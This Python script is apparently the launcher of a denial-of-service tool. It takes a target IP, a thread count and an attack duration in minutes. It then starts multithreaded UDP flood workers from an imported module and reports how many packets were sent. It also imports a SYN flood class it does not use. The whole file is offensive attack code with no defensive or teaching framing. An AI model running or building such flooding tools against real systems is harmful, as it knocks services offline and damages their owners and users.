#!/usr/bin/env python3.5
import argparse
from udpflood import UDPFlood
import argparse
from datetime import datetime
import time
import queue
from colors import bcolors
from synflood import SYNFlood
import sys

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip", help="listening ip", required=True)
parser.add_argument("-p", "--port", help="listening port", type=int)
parser.add_argument("-t", "--threads", help="amount of threads",
                    type=int, required=True)
parser.add_argument(
    "-d", "--duration", help="duration of attack in minutes", type=int, required=True)
args = parser.parse_args()

ip = args.ip
port = args.port
threads = args.threads
duration = args.duration
thread = []
sent_packets = []


def Main():
    try:
        start_time = datetime.now()
        q = queue.Queue()
        print(bcolors.OKBLUE + "Information:" + bcolors.ENDC)
        print(bcolors.HEADER + "\t[-] IP: " + ip + bcolors.ENDC)
        print(bcolors.HEADER + "\t[-] DURATION: " +
              str(duration) + bcolors.ENDC)
        for t in range(0, threads):
            newThread = UDPFlood(ip, duration)
            thread.append(newThread)
            newThread.daemon = True
            newThread.start()
        for t in thread:
            t.join()
            sent_packets.append(t.sent_packets)
        total_sent_packets = 0
        for amount in sent_packets:
            total_sent_packets = total_sent_packets + amount
        end_time = datetime.now()
        runtime = end_time - start_time
        print(bcolors.OKGREEN + "\t[-] SENT PACKETS: [" +
              str(total_sent_packets) + "]IN " + str(runtime))

    except KeyboardInterrupt:
        end_time = datetime.now()
        runtime = end_time - start_time
        print(bcolors.FAIL + "\t[!] INTERRUPTED" + bcolors.ENDC)
        for t in thread:
            sent_packets.append(t.sent_packets)
        total_sent_packets = 0
        for amount in sent_packets:
            total_sent_packets = total_sent_packets + amount
        print(bcolors.OKGREEN + "\t[-] SENT PACKETS: " +
              str(total_sent_packets) + " IN " + str(runtime))
        sys.exit(1)


if __name__ == '__main__':
    Main()
